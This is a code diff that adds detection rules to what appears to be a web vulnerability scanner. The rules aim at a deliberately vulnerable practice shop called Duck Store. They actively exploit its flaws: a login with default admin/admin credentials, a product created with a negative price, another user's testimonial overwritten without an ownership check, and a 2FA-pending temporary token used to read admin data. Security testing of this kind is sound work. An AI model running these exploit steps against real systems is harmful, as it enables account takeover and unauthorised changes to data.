@@ -5,6 +5,7 @@
 // (idorProbe, clientOnlyAuth, serverActionAuthz) intentionally do not run on the free path;
 // they exist so the worker / future deep flow can share the same registry keys.
 
+import { createHmac } from "crypto";
 import {
   thugirJwtClaims,
   thugirJsEndpoints,
@@ -32811,6 +32812,275 @@ const duckStoreReferralCodeAbuseRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+function duckStoreBase32Decode(secret: string): Buffer {
+  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+  const cleaned = secret.replace(/=+$/g, "").toUpperCase();
+  let bits = "";
+  for (const char of cleaned) {
+    const val = alphabet.indexOf(char);
+    if (val < 0) continue;
+    bits += val.toString(2).padStart(5, "0");
+  }
+  const bytes: number[] = [];
+  for (let i = 0; i + 8 <= bits.length; i += 8) {
+    bytes.push(parseInt(bits.slice(i, i + 8), 2));
+  }
+  return Buffer.from(bytes);
+}
+
+function duckStoreTotpCode(secret: string, forTime = Math.floor(Date.now() / 1000)): string {
+  const key = duckStoreBase32Decode(secret);
+  const counter = Buffer.alloc(8);
+  counter.writeBigUInt64BE(BigInt(Math.floor(forTime / 30)));
+  const hash = createHmac("sha1", key).update(counter).digest();
+  const offset = hash[hash.length - 1] & 0x0f;
+  const code = (hash.readUInt32BE(offset) & 0x7fffffff) % 1_000_000;
+  return code.toString().padStart(6, "0");
+}
+
+async function duckStoreEnableTotp(ctx: RuleContext, token: string): Promise<boolean> {
+  const setupUrl = new URL("/api/v1/totp/setup", ctx.origin).toString();
+  const setupDoc = await ctx.probe.get(setupUrl, {
+    headers: { Authorization: `Bearer ${token}` },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (setupDoc.status < 200 || setupDoc.status >= 400) return false;
+  let secret = "";
+  try {
+    secret = (JSON.parse(setupDoc.body) as { secret?: string }).secret ?? "";
+  } catch {
+    return false;
+  }
+  if (!secret) return false;
+  const enableUrl = new URL("/api/v1/totp/enable", ctx.origin).toString();
+  const enableDoc = await ctx.probe.get(enableUrl, {
+    method: "POST",
+    body: JSON.stringify({ token: duckStoreTotpCode(secret) }),
+    headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  return enableDoc.status >= 200 && enableDoc.status < 300 && /2FA enabled successfully/i.test(enableDoc.body);
+}
+
+async function duckStoreAdminLoginToken(ctx: RuleContext): Promise<string | null> {
+  const loginUrl = new URL("/api/v1/auth/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username: "admin", password: "admin" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return null;
+  try {
+    const data = JSON.parse(loginDoc.body) as { access_token?: string; requires_totp?: boolean };
+    if (data.requires_totp || !data.access_token) return null;
+    return data.access_token;
+  } catch {
+    return null;
+  }
+}
+
+const duckStoreAdminProductsNegativePriceLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const token = await duckStoreAdminLoginToken(ctx);
+  if (!token) return NEGATIVE;
+  const postUrl = new URL("/api/v1/admin/products", ctx.origin).toString();
+  const postDoc = await ctx.probe.get(postUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      name: `Thugir Probe ${Date.now().toString(36)}`,
+      description: "negative price probe",
+      price: -99.99,
+      stock: 1,
+      color: "Red",
+      material: "Rubber",
+      size: "Small",
+      image_url: "/static/products/classic-duck.png"
+    }),
+    headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (postDoc.status < 200 || postDoc.status >= 400) return NEGATIVE;
+  if (!/"price"\s*:\s*-99\.99/.test(postDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      postUrl,
+      price: -99.99,
+      snippet: postDoc.body.slice(0, 200).trim(),
+      note: "Duck Store POST /api/v1/admin/products accepts price:-99.99 without server-side validation — negative product price business-logic oracle"
+    }
+  };
+};
+
+const duckStoreAdminProductsNegativePriceRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/admin\/products/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreAdminProductsNegativePriceLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/admin/products route scan — POST accepts negative product price without validation"
+    }
+  };
+};
+
+const duckStoreTestimonialsPutBolaLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const tokenA = await duckStoreRegisterAndLoginToken(ctx);
+  if (!tokenA) return NEGATIVE;
+  const original = `User A testimonial ${Date.now().toString(36)}`;
+  const hijacked = `User B hijacked ${Date.now().toString(36)}`;
+  const postUrl = new URL("/api/v1/testimonials/", ctx.origin).toString();
+  const postDoc = await ctx.probe.get(postUrl, {
+    method: "POST",
+    body: JSON.stringify({ content: original, rating: 5 }),
+    headers: { Authorization: `Bearer ${tokenA}`, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (postDoc.status < 200 || postDoc.status >= 400) return NEGATIVE;
+  let testimonialId: number | undefined;
+  try {
+    testimonialId = (JSON.parse(postDoc.body) as { id?: number }).id;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!testimonialId) return NEGATIVE;
+  const tokenB = await duckStoreRegisterAndLoginToken(ctx);
+  if (!tokenB) return NEGATIVE;
+  const putUrl = new URL(`/api/v1/testimonials/${testimonialId}`, ctx.origin).toString();
+  const putDoc = await ctx.probe.get(putUrl, {
+    method: "PUT",
+    body: JSON.stringify({ content: hijacked, rating: 1 }),
+    headers: { Authorization: `Bearer ${tokenB}`, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (putDoc.status < 200 || putDoc.status >= 400) return NEGATIVE;
+  if (!putDoc.body.includes(hijacked)) return NEGATIVE;
+  const getDoc = await ctx.probe.get(putUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (getDoc.status < 200 || getDoc.status >= 400) return NEGATIVE;
+  if (!getDoc.body.includes(hijacked)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      postUrl,
+      putUrl,
+      testimonialId,
+      original,
+      hijacked,
+      snippet: putDoc.body.slice(0, 200).trim(),
+      note: "Duck Store PUT /api/v1/testimonials/{id} lets user B overwrite user A's testimonial without ownership check — BOLA oracle"
+    }
+  };
+};
+
+const duckStoreTestimonialsPutBolaRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/testimonials(?:\/\d+)?/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreTestimonialsPutBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/testimonials/{id} route scan — PUT overwrites another user's testimonial without ownership validation"
+    }
+  };
+};
+
+const duckStoreAuthTotpBypassLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const token = await duckStoreRegisterAndLoginToken(ctx);
+  if (!token) return NEGATIVE;
+  const enabled = await duckStoreEnableTotp(ctx, token);
+  if (!enabled) return NEGATIVE;
+  const profileUrl = new URL("/api/v1/users/me/profile", ctx.origin).toString();
+  const profileDoc = await ctx.probe.get(profileUrl, {
+    headers: { Authorization: `Bearer ${token}` },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (profileDoc.status < 200 || profileDoc.status >= 400) return NEGATIVE;
+  let username = "";
+  try {
+    username = (JSON.parse(profileDoc.body) as { username?: string }).username ?? "";
+  } catch {
+    return NEGATIVE;
+  }
+  if (!username) return NEGATIVE;
+  const loginUrl = new URL("/api/v1/auth/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password: "ThugirTest123!" }),
+    headers: {
+      "Content-Type": "application/json",
+      "X-Thugir-Nonce": `totp-relogin-${Date.now()}`
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 400) return NEGATIVE;
+  let login: { access_token?: string | null; requires_totp?: boolean; temp_token?: string | null };
+  try {
+    login = JSON.parse(loginDoc.body) as typeof login;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!login.requires_totp || login.access_token || !login.temp_token) return NEGATIVE;
+  const adminUrl = new URL("/api/v1/admin/users", ctx.origin).toString();
+  const adminDoc = await ctx.probe.get(adminUrl, {
+    headers: { Authorization: `Bearer ${login.temp_token}` },
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (adminDoc.status < 200 || adminDoc.status >= 400) return NEGATIVE;
+  if (!/"email"\s*:\s*"admin@duck-store\.escape"/i.test(adminDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.95,
+    evidence: {
+      loginUrl,
+      adminUrl,
+      requires_totp: login.requires_totp,
+      snippet: adminDoc.body.slice(0, 200).trim(),
+      note: "Duck Store login temp_token is accepted as a full Bearer JWT on protected routes without completing POST /api/v1/auth/login/totp — 2FA bypass oracle"
+    }
+  };
+};
+
+const duckStoreAuthTotpBypassRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/auth\/login(?:\/totp)?/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreAuthTotpBypassLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/auth/login route scan — temp_token from 2FA-pending login works as full access token without TOTP verification"
+    }
+  };
+};
+
 function isDvgaLiveHost(ctx: RuleContext): boolean {
   const urls = [ctx.origin, ctx.scanUrl || "", ctx.home.finalUrl || ""];
   return urls.some((raw) => {
@@ -42489,6 +42759,12 @@ export const RULES: Record<string, Rule> = {
   duckStoreOpenRedirectRouteLiveOracle,
   duckStoreReferralCodeAbuseLiveOracle,
   duckStoreReferralCodeAbuseRouteLiveOracle,
+  duckStoreAdminProductsNegativePriceLiveOracle,
+  duckStoreAdminProductsNegativePriceRouteLiveOracle,
+  duckStoreTestimonialsPutBolaLiveOracle,
+  duckStoreTestimonialsPutBolaRouteLiveOracle,
+  duckStoreAuthTotpBypassLiveOracle,
+  duckStoreAuthTotpBypassRouteLiveOracle,
   dvgaRouteLiveOracle,
   ginAndJuiceCatalogSearchXssLiveOracle,
   ginAndJuiceCatalogRouteLiveOracle,
